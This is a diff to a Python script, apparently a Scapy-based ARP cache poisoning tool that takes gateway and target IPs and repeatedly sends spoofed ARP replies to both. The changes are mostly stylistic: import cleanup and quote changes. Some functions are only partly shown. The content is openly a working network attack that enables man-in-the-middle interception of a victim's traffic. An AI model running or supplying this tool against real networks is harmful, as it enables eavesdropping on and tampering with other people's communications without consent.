@@ -1,10 +1,13 @@
-from scapy.all import *
 import argparse
 import socket
+import time
 
-parser = argparse.ArgumentParser(description='ARP Cache Poisoning using Scapy.')
-parser.add_argument('--gateway', '-g', help='Gateway IP', required=True)
-parser.add_argument('--target', '-t', help='Target IP', required=True)
+from scapy.layers.l2 import ARP
+from scapy.sendrecv import send, sr1
+
+parser = argparse.ArgumentParser(description="ARP Cache Poisoning using Scapy.")
+parser.add_argument("--gateway", "-g", help="Gateway IP", required=True)
+parser.add_argument("--target", "-t", help="Target IP", required=True)
 
 args = parser.parse_args()
 
@@ -30,12 +33,12 @@ def poison(gwIP, gwMAC, tgIP, tgMAC):
     poison_gateway.pdst = gwIP
     poison_gateway.hwdst = gwMAC
 
-    print('[*] Beginning ARP poisoning... [CTRL-C to stop]')
+    print("[*] Beginning ARP poisoning... [CTRL-C to stop]")
     while True:
         send(poison_target, verbose=False)
         send(poison_gateway, verbose=False)
         time.sleep(2)
 
 
-if __name__ == '__main__':
-    poison(args.gateway,getMAC(args.gateway),args.target,getMAC(args.target))
+if __name__ == "__main__":
+    poison(args.gateway, getMAC(args.gateway), args.target, getMAC(args.target))
